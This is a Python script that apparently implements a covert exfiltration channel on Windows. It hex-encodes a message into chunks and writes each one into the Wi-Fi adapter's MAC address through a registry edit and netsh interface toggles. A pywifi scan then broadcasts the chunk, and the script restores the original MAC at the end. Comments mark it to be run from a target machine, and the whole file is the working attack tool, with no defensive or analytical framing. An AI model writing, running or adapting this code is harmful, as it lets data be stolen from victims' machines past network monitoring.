import subprocess
import time
import pywifi

transferMode = 2  # maximum 255 chunks, 510 bytes per buffer
startbytes = "aa" # Session id, while not very complex can be increased but impacts transfer speeds

def return_mac_to_normal():
    subprocess.run(
    'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}\\0005" /v NetworkAddress /t REG_SZ /d "" /f && '
    'netsh interface set interface name="Wi-Fi 2" admin=disable && '
    'netsh interface set interface name="Wi-Fi 2" admin=enable',
    shell=True, check=True
    )

def exfiltrate(msg):
    
    subprocess.run(
    'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}\\0005" /v NetworkAddress /t REG_SZ /d "' + msg +'" /f && '
    'netsh interface set interface name="Wi-Fi 2" admin=disable && '
    'netsh interface set interface name="Wi-Fi 2" admin=enable',
    shell=True, check=True
    )

    # Initialize the PyWiFi instance
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # Get the first wireless interface

    # Start scanning for networks
    iface.scan()
    #time.sleep(1)  # Wait a moment for the scan to complete

    # Get the list of available networks
    #scan_results = iface.scan_results()

    # Iterate over the results and print SSIDs
    #for network in scan_results:
        #print(f"SSID: {network.ssid}")

    # Example: Filter networks based on some criteria (e.g., SSID contains 'Home')
    #wildcard_ssids = [network.ssid for network in scan_results if 'Home' in network.ssid]
    #print("Filtered SSIDs:", wildcard_ssids)
    
#exfiltrate("AABBCCDD1111") # message
#exfiltrate("AABBCCDD2222")
#exfiltrate("AABBCCDD3333")
#exfiltrate("AABBCCDD4444")


def encoder(message, chunk_num):
    global chunk_len
    global startbytes
    
    # |A|A|0|0|F|F|F|F|
    #  0 1 2 3 4 5 6 7
    
    chunk_len = 0
    
    if transferMode == 2:
        chunk_len = 4
    
    hh = ""
    h = ''.join(hex(ord(c))[2:] for c in message)
    #print(h) #prints hex
    if len(message) < chunk_len:
        hh = startbytes + chunk_num + h
        padding = 7 - len(h) + 1
        
        for o in range(0, padding):
            hh += "0"
            
    elif len(message) == chunk_len:
        hh = startbytes + chunk_num + h
        #hh += "00" # Do not append
        
    print(hh)
    return hh

def packager(message):
    responses  = [(message[i:i+4]) for i in range(0, len(message), 4)]
    return responses
    
def neutrino_concentrator(message):
    c = 0 # make counter
    responses = packager(message)
    
    # Session Info Message
    if c == 0:
        hex_value = f"{len(responses):02X}"
        rr = encoder("",str(hex_value)) 
        exfiltrate(rr)
        c = c + 1
        
    for r in responses:
        hex_value = f"{c:02X}"
        rr = encoder(str(r),str(hex_value)) 
        exfiltrate(rr)
        c = c + 1

    
    print("Sent messages: " + str(responses))
    return_mac_to_normal()

message    = "Test message"
message2   = "test2"
message3   = "Quinn Is great... he is a guru"
# Run from target machine
neutrino_concentrator(message3)

#exfiltrate("AA7465737431")
#exfiltrate("AA77686F616D")
#exfiltrate("AA6900000000")

# structure of mac payload
# | ID | char | char | char | char | char | char | del |
#    0     1      2      3      4      5      6     7
#
# Two types of delimiters
# 99 - Start message
# 00 - end of message
# 0A - newline 
